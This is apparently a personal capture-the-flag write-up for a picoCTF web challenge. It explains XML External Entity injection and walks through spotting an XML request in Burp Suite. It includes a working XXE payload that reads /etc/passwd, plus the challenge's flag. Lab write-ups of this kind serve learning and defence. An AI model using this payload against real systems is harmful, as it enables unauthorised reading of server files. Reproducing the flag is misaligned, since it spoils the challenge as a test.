#xxe #XXE 
##### Challenge Description

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:61991/)

## What is a XXE ?

XML External Entity (XXE) injection is a security vulnerability where an improperly configured XML parser allows a document to define custom entities that point to external resources. By exploiting this, an attacker can force the server to disclose sensitive local files, perform internal network requests (SSRF), or cause a Denial of Service.
#### Understanding 

I went in the Debugger tab then I tried to understand what was happening in there. 

And After reading the code file, I understood that each time I click on details, it fetches the details in xml so I needed to do an XXE

![](../../PicoCTF-assets/Pasted%20image%2020260308235805.png)

Then after clicking on details ,

![](../../PicoCTF-assets/Pasted%20image%2020260309000040.png)


I found this request in BurpSuite,

![](../../PicoCTF-assets/Pasted%20image%2020260308233622.png)

### Get the content of /etc/passwd using XXE

According to the challenge description I need to find the flag in /etc/passwd :

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data><ID>&xxe;</ID></data>
```


![](../../PicoCTF-assets/Pasted%20image%2020260308235239.png)

Flag : picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}